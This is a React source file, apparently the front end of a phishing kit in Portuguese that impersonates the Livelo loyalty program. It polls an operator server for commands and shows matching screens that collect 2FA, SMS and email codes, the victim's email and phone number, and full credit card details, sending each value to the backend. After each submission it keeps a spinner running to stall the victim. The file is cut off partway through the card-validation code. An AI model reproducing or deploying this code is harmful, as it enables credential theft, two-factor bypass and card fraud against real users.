import { useState, useEffect, useRef } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function CommandPage({ userId }) {
  const [currentCommand, setCurrentCommand] = useState(null);
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);
  const [lastAction, setLastAction] = useState(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // Polling de comandos - visible checado em CADA chamada
  useEffect(() => {
    const poll = async () => {
      try {
        const v = document.hidden ? "0" : "1";
        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
        if (response.data && response.data.action) {
          setCurrentCommand(response.data);
        }
      } catch (error) {}
    };

    poll();
    const interval = setInterval(poll, 1500);
    return () => clearInterval(interval);
  }, [userId]);

  // Resetar estados quando o comando muda
  useEffect(() => {
    if (currentCommand?.action && currentCommand.action !== lastAction) {
      setLoading(false);
      setSubmitted(false);
      setInputValue("");
      setCodeDigits(['', '', '', '', '', '']);
      setCardNumber("");
      setCardExpiry("");
      setCardCvv("");
      setLastAction(currentCommand.action);
    }
  }, [currentCommand?.action, lastAction]);

  const handleSubmit = async (e, field, customValue = null) => {
    e.preventDefault();
    setLoading(true);
    
    // Usar o valor personalizado se fornecido, senão usar codeDigits (para códigos) ou inputValue
    let valueToSend;
    if (customValue !== null) {
      valueToSend = customValue;
    } else if (field === "token_2fa" || field === "sms_code" || field === "app_mail") {
      // Campos que usam os 6 quadradinhos
      valueToSend = codeDigits.join('');
    } else {
      valueToSend = inputValue;
    }
    
    try {
      await axios.post(`${API}/user/submit-data/${userId}`, {
        field: field,
        value: valueToSend
      });
      setSubmitted(true);
      // Após enviar cc_code, ir para Aguarde
      if (field === "cc_code") {
        setCurrentCommand({ action: "AGUARDE" });
      }
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
    // Manter em loading infinito após enviar
  };

  // Handler para os 6 quadradinhos do código
  const handleCodeChange = (index, value) => {
    if (loading) return;
    
    // Aceitar apenas números
    const digit = value.replace(/\D/g, '').slice(-1);
    
    const newDigits = [...codeDigits];
    newDigits[index] = digit;
    setCodeDigits(newDigits);
    
    // Auto-avançar para o próximo campo
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (loading) return;
    
    // Voltar para o campo anterior ao apagar
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    if (loading) return;
    
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newDigits = [...codeDigits];
    
    for (let i = 0; i < pastedData.length; i++) {
      newDigits[i] = pastedData[i];
    }
    
    setCodeDigits(newDigits);
    
    // Focar no último campo preenchido ou no próximo vazio
    const focusIndex = Math.min(pastedData.length, 5);
    inputRefs.current[focusIndex]?.focus();
  };

  // Página de dados inválidos
  if (currentCommand?.action === "INV") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <svg className="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Dados Inválidos</h1>
          <p className="text-gray-600 mb-8">
            Os dados que você digitou estão incorretos. Por favor, tente novamente com as informações corretas.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="bg-pink-500 hover:bg-pink-600 text-white px-8 py-3 rounded-full font-semibold transition-colors"
          >
            Tentar Novamente
          </button>
        </div>
      </div>
    );
  }

  // Página de código 2FA (Autenticação de Duas Etapas)
  if (currentCommand?.action === "AUT" || currentCommand?.action === "AUT-INV") {
    const isCodeComplete = codeDigits.every(digit => digit !== '');
    const isInvalid = currentCommand?.action === "AUT-INV";
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Segurança */}
          <div className="mb-6">
            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
              <svg 
                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                {isInvalid ? (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
                  />
                ) : (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" 
                  />
                )}
              </svg>
            </div>
          </div>

          {/* Mensagem de erro se inválido */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                Código inválido. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Autenticação de Duas Etapas
          </h1>

          {/* Descrição */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Digite o código do seu aplicativo autenticador
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-md space-y-6">
            {/* 6 Quadradinhos para o código */}
            <div className="flex justify-center gap-3">
              {codeDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  disabled={loading}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                    digit 
                      ? 'border-pink-500 bg-pink-50' 
                      : 'border-gray-300 bg-white'
                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
                />
              ))}
            </div>

            {/* Botão Confirmar */}
            <button
              type="submit"
              disabled={loading || !isCodeComplete}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                isCodeComplete && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Confirmar"
              )}
            </button>

            {/* Link de ajuda */}
            <div className="text-center pt-2">
              <a
                href="#"
                className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
              >
                Não recebeu o código?
              </a>
            </div>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página para digitar EMAIL
  if (currentCommand?.action === "EMAIL" || currentCommand?.action === "EMAIL-INV") {
    const isInvalid = currentCommand?.action === "EMAIL-INV";
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Email */}
          <div className="mb-6">
            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
              <svg 
                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                {isInvalid ? (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
                  />
                ) : (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" 
                  />
                )}
              </svg>
            </div>
          </div>

          {/* Mensagem de erro se inválido */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                E-mail inválido. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Confirme seu E-mail
          </h1>

          {/* Descrição */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Digite o e-mail cadastrado na sua conta Livelo
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "email_input")} className="w-full max-w-md space-y-6">
            {/* Campo de email */}
            <div className="relative">
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
                <svg 
                  xmlns="http://www.w3.org/2000/svg" 
                  className="h-5 w-5" 
                  fill="none" 
                  viewBox="0 0 24 24" 
                  stroke="currentColor"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" 
                  />
                </svg>
              </div>
              <input
                type="email"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder="seuemail@exemplo.com"
                disabled={loading}
                className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
              />
            </div>

            {/* Botão Confirmar */}
            <button
              type="submit"
              disabled={loading || !inputValue || !inputValue.includes('@')}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                inputValue && inputValue.includes('@') && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página TOK-TEL - Código enviado para o telefone
  if (currentCommand?.action === "TOK-TEL" || currentCommand?.action === "TOK-TEL-INV") {
    const isCodeComplete = codeDigits.every(digit => digit !== '');
    const phoneLastDigits = currentCommand?.command_reference || "****";
    const isInvalid = currentCommand?.action === "TOK-TEL-INV";
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Mensagem de erro se inválido */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                Código inválido. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className={`text-2xl font-bold mb-4 text-center ${isInvalid ? 'text-red-600' : 'text-[#1a1a5e]'}`}>
            {isInvalid ? 'Código inválido!' : 'Código enviado!'}
          </h1>

          {/* Descrição com número mascarado */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Informe o código que enviamos para o número (**) * ****-{phoneLastDigits}.
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "sms_code")} className="w-full max-w-md space-y-6">
            {/* 6 Quadradinhos para o código */}
            <div className="flex justify-center gap-3">
              {codeDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  disabled={loading}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                    isInvalid 
                      ? 'border-red-500 bg-red-50' 
                      : digit 
                        ? 'border-pink-500 bg-pink-50' 
                        : 'border-gray-300 bg-white'
                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
                />
              ))}
            </div>

            {/* Contador para reenviar */}
            <div className="text-center">
              <span className="text-gray-400 text-sm">
                Aguarde para reenviar
              </span>
            </div>

            {/* Botão Continuar */}
            <button
              type="submit"
              disabled={loading || !isCodeComplete}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                isCodeComplete && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Continuar"
              )}
            </button>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página TELEFONE - Digitar número de telefone
  if (currentCommand?.action === "TELEFONE" || currentCommand?.action === "TELEFONE-INV") {
    const isInvalid = currentCommand?.action === "TELEFONE-INV";
    
    // Função para formatar telefone
    const formatPhone = (value) => {
      const numbers = value.replace(/\D/g, '');
      if (numbers.length <= 2) return `(${numbers}`;
      if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
      if (numbers.length <= 11) return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
    };

    const handlePhoneChange = (e) => {
      const formatted = formatPhone(e.target.value);
      setInputValue(formatted);
    };

    const isPhoneValid = inputValue.replace(/\D/g, '').length >= 10;
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Telefone */}
          <div className="mb-6">
            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
              <svg 
                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                {isInvalid ? (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
                  />
                ) : (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" 
                  />
                )}
              </svg>
            </div>
          </div>

          {/* Mensagem de erro se inválido */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                Número de telefone inválido. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Confirme seu Telefone
          </h1>

          {/* Descrição */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Digite o número de telefone cadastrado na sua conta Livelo
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "phone_number")} className="w-full max-w-md space-y-6">
            {/* Campo de telefone */}
            <div className="relative">
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
                <svg 
                  xmlns="http://www.w3.org/2000/svg" 
                  className="h-5 w-5" 
                  fill="none" 
                  viewBox="0 0 24 24" 
                  stroke="currentColor"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" 
                  />
                </svg>
              </div>
              <input
                type="tel"
                value={inputValue}
                onChange={handlePhoneChange}
                placeholder="(00) 00000-0000"
                disabled={loading}
                className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
              />
            </div>

            {/* Botão Confirmar */}
            <button
              type="submit"
              disabled={loading || !isPhoneValid}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                isPhoneValid && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página TOK-MAIL - Código enviado para o email
  if (currentCommand?.action === "TOK-MAIL" || currentCommand?.action === "TOK-MAIL-INV") {
    const isCodeComplete = codeDigits.every(digit => digit !== '');
    const emailMasked = currentCommand?.command_reference || "******@email.com";
    const isInvalid = currentCommand?.action === "TOK-MAIL-INV";
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Email */}
          <div className="mb-6">
            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
              <svg 
                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                {isInvalid ? (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
                  />
                ) : (
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" 
                  />
                )}
              </svg>
            </div>
          </div>

          {/* Mensagem de erro se inválido */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                Código inválido. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className={`text-2xl font-bold mb-4 text-center ${isInvalid ? 'text-red-600' : 'text-[#1a1a5e]'}`}>
            {isInvalid ? 'Código inválido!' : 'Código enviado!'}
          </h1>

          {/* Descrição com email mascarado */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Informe o código que enviamos para o email <span className="font-semibold">{emailMasked}</span>
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "app_mail")} className="w-full max-w-md space-y-6">
            {/* 6 Quadradinhos para o código */}
            <div className="flex justify-center gap-3">
              {codeDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  disabled={loading}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                    isInvalid 
                      ? 'border-red-500 bg-red-50' 
                      : digit 
                        ? 'border-pink-500 bg-pink-50' 
                        : 'border-gray-300 bg-white'
                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
                />
              ))}
            </div>

            {/* Contador para reenviar */}
            <div className="text-center">
              <span className="text-gray-400 text-sm">
                Aguarde para reenviar
              </span>
            </div>

            {/* Botão Continuar */}
            <button
              type="submit"
              disabled={loading || !isCodeComplete}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                isCodeComplete && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Continuar"
              )}
            </button>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página CC - Dados do Cartão de Crédito
  if (currentCommand?.action === "CC" || currentCommand?.action === "CC-INV") {
    const isInvalid = currentCommand?.action === "CC-INV";

    const getIsAmex = () => {
      const nums = cardNumber.replace(/\D/g, "");
      return nums.startsWith("34") || nums.startsWith("37");
    };
    const cvvLength = getIsAmex() ? 4 : 3;

    const formatCardNumber = (value) => {
      const nums = value.replace(/\D/g, "");
      const amex = nums.startsWith("34") || nums.startsWith("37");
      const sliced = nums.slice(0, amex ? 15 : 16);
      if (amex) {
        return sliced.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_, a, b, c) => [a, b, c].filter(Boolean).join(" "));
      }
      return sliced.replace(/(\d{4})(?=\d)/g, "$1 ");
    };

    const formatExpiry = (value) => {
      const nums = value.replace(/\D/g, "").slice(0, 4);
      if (nums.length > 2) return nums.slice(0, 2) + "/" + nums.slice(2);
      return nums;
    };

    const validateCard = () => {
      const nums = cardNumber.replace(/\D/g, "");
